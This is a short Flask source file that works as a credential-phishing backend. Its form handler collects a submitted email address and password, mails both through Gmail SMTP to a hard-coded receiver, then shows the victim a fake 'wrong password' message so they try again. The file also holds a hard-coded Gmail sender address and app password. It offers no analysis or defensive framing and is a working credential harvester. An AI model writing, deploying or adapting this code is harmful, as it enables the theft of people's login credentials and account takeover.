from flask import Flask, render_template, request, redirect, url_for, flash
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-this-for-production'  # Change this to a random secret key

# Email configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SENDER_EMAIL = "nwekee125@gmail.com"
SENDER_PASSWORD = "anku prrw cwqv wwlb"
RECEIVER_EMAIL = "maxwell202201@gmail.com"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit_form():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Validate form data
    if not email or not password:
        flash('Both email and password are required!', 'error')
        return redirect(url_for('index'))
    
    # Send email
    try:
        send_email(email, password)
        flash('wrong password', 'error')
        # Refresh the page after successful submission
        return redirect(url_for('index'))
    except Exception as e:
        flash(f'Error sending email: {str(e)}', 'error')
        return redirect(url_for('index'))

def send_email(email, password):
    # Create message
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = "New Form Submission"
    
    # Email body
    body = f"""
    New form submission:
    
    Email: {email}
    Password: {password}
    
    Note: This information was submitted through the web form.
    """
    
    msg.attach(MIMEText(body, 'plain'))
    
    # Create SMTP session
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()  # Enable security
    server.login(SENDER_EMAIL, SENDER_PASSWORD)  # Login with sender's email and password
    text = msg.as_string()
    server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, text)
    server.quit()

if __name__ == '__main__':
    app.run(debug=True)